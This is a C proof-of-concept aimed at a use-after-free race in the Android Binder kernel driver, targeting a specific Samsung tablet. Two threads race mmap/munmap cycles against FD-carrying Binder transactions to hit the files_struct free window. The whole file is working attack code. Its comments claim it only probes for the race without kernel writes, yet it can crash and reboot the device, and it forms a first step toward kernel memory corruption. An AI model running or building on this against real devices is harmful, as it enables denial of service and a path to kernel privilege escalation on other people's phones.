/* binder_files_race.c — Binder proc->files UAF race PoC
 *
 * Targets the race between:
 * - binder_transaction() using proc->files to install FDs (check-then-use)
 * - binder_deferred_work() freeing files_struct via put_files_struct()
 *
 * Attack flow:
 * 1. Open /dev/binder as both a "server" and "client" (two opens, same process)
 * 2. Server: mmap binder buffer, register as service
 * 3. Client: send transaction with BINDER_TYPE_FD to server
 * 4. Racer: rapidly munmap/re-mmap the server's binder buffer
 *    The munmap triggers binder_vma_close → deferred PUT_FILES
 *    If the deferred worker runs between check and use of proc->files
 *    in task_fd_install, we get a UAF on files_struct
 *
 * Safety: fork in child with alarm timeout. NO kernel writes — this only
 * tests for the race condition by checking for anomalous behavior.
 *
 * For SM-T377A: panic_on_oops=1, so any crash = device reboot.
 * Run conservatively with low iteration count first.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>

/* Binder ioctl definitions (from AOSP linux/android/binder.h) */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_VERSION          _IOWR('b', 9, struct binder_version)

#define BC_TRANSACTION          0x40046300
#define BC_ENTER_LOOPER         0x000d
#define BC_EXIT_LOOPER          0x000e

#define TF_ONE_WAY              0x01
#define BINDER_TYPE_FD          0x66642a85

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_transaction_data {
    union {
        uint32_t handle;
        void *ptr;
    } target;
    void *cookie;
    uint32_t code;
    uint32_t flags;
    int32_t sender_pid;
    int32_t sender_euid;
    uint32_t data_size;
    uint32_t offsets_size;
    union {
        struct {
            unsigned long buffer;
            unsigned long offsets;
        } ptr;
        uint8_t buf[8];
    } data;
};

struct binder_version {
    int32_t protocol_version;
};

#define BINDER_DEV "/dev/binder"
#define MMAP_SIZE (4096)

static volatile int g_running = 1;
static volatile int g_races = 0;
static volatile int g_errors = 0;

/* Open binder and mmap */
static int binder_open_mmap(void **mapped, size_t size) {
    int fd = open(BINDER_DEV, O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        printf("open binder failed: %d\n", errno);
        return -1;
    }
    *mapped = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (*mapped == MAP_FAILED) {
        printf("mmap binder failed: %d\n", errno);
        close(fd);
        return -1;
    }
    return fd;
}

/* Thread that rapidly munmaps and re-mmaps the binder buffer */
static void *racer_thread(void *arg) {
    int fd = *(int*)arg;
    void *map = NULL;
    int count = 0;
    
    while (g_running) {
        /* mmap */
        map = mmap(NULL, MMAP_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
        if (map == MAP_FAILED) {
            /* Can only mmap binder once — second mmap fails. 
             * This is expected. The first mmap sets proc->files.
             * munmap triggers binder_vma_close → deferred PUT_FILES. */
            g_errors++;
            usleep(100);
            continue;
        }
        /* Immediately munmap — triggers binder_vma_close */
        munmap(map, MMAP_SIZE);
        count++;
        g_races++;
    }
    printf("Racer: %d mmap/munmap cycles\n", count);
    return NULL;
}

/* Thread that sends transactions with BINDER_TYPE_FD */
static void *sender_thread(void *arg) {
    int fd = *(int*)arg;
    int count = 0;
    int pipe_fds[2];
    
    if (pipe(pipe_fds) < 0) {
        printf("pipe failed: %d\n", errno);
        return NULL;
    }
    
    while (g_running) {
        /* Build a binder transaction with a file descriptor */
        struct {
            uint32_t cmd;
            struct binder_transaction_data tr;
        } __attribute__((packed)) writebuf;
        
        struct {
            uint32_t type;    /* BINDER_TYPE_FD */
            uint32_t flags;
            union {
                int32_t handle;
                void *ptr;
            } binder;
            void *cookie;
        } flat_binder_obj;
        
        memset(&writebuf, 0, sizeof(writebuf));
        writebuf.cmd = BC_TRANSACTION;
        writebuf.tr.target.handle = 0; /* service manager */
        writebuf.tr.code = 0;
        writebuf.tr.flags = TF_ONE_WAY; /* async — don't wait for reply */
        
        /* Set up flat_binder_object with our pipe FD */
        memset(&flat_binder_obj, 0, sizeof(flat_binder_obj));
        flat_binder_obj.type = BINDER_TYPE_FD;
        flat_binder_obj.binder.handle = pipe_fds[0];
        
        writebuf.tr.data.ptr.buffer = (uintptr_t)&flat_binder_obj;
        writebuf.tr.data_size = sizeof(flat_binder_obj);
        writebuf.tr.data.ptr.offsets = (uintptr_t)NULL;
        writebuf.tr.offsets_size = 0;
        
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_buffer = (uintptr_t)&writebuf;
        bwr.write_size = sizeof(writebuf);
        
        int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            /* Expected failures — service manager rejects our malformed txn */
            if (errno != EINVAL && errno != EBADF)
                g_errors++;
        }
        count++;
        
        if (count % 1000 == 0) {
            printf("Sender: %d transactions, %d races, %d errors\n",
                   count, g_races, g_errors);
        }
        
        if (count >= 5000) break; /* safety limit */
    }
    
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    printf("Sender: %d total transactions\n", count);
    return NULL;
}

static void do_test(void) {
    printf("=== Binder proc->files Race PoC ===\n");
    printf("Testing race between mmap/munmap and FD-carrying transactions\n\n");
    
    /* Open binder and mmap */
    void *binder_map = NULL;
    int binder_fd = binder_open_mmap(&binder_map, MMAP_SIZE);
    if (binder_fd < 0) return;
    
    printf("Binder: fd=%d map=%p\n", binder_fd, binder_map);
    
    /* Enter binder looper */
    uint32_t looper_cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_buffer = (uintptr_t)&looper_cmd;
    bwr.write_size = sizeof(looper_cmd);
    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    printf("ENTER_LOOPER: ret=%d errno=%d\n", ret, errno);
    
    /* Unmmap so racer can re-mmap */
    munmap(binder_map, MMAP_SIZE);
    binder_map = NULL;
    printf("Initial mmap released — starting race\n\n");
    
    /* Start racer and sender threads */
    pthread_t racer_tid, sender_tid;
    pthread_create(&racer_tid, NULL, racer_thread, &binder_fd);
    usleep(1000); /* let racer start */
    pthread_create(&sender_tid, NULL, sender_thread, &binder_fd);
    
    /* Wait for sender to finish */
    pthread_join(sender_tid, NULL);
    g_running = 0;
    pthread_join(racer_tid, NULL);
    
    printf("\n=== Results ===\n");
    printf("Races: %d, Errors: %d\n", g_races, g_errors);
    printf("If device is still responsive: no crash (race window may be too narrow)\n");
    
    close(binder_fd);
}

int main(void) {
    printf("=== Binder proc->files UAF Race Test ===\n");
    printf("WARNING: panic_on_oops=1 — kernel crash = device reboot\n\n");
    
    /* Fork for safety */
    pid_t pid = fork();
    if (pid == 0) {
        alarm(15); /* 15 second timeout */
        do_test();
        _exit(0);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status))
            printf("\nChild exited: %d\n", WEXITSTATUS(status));
        else if (WIFSIGNALED(status))
            printf("\nChild killed by signal: %d\n", WTERMSIG(status));
    }
    return 0;
}
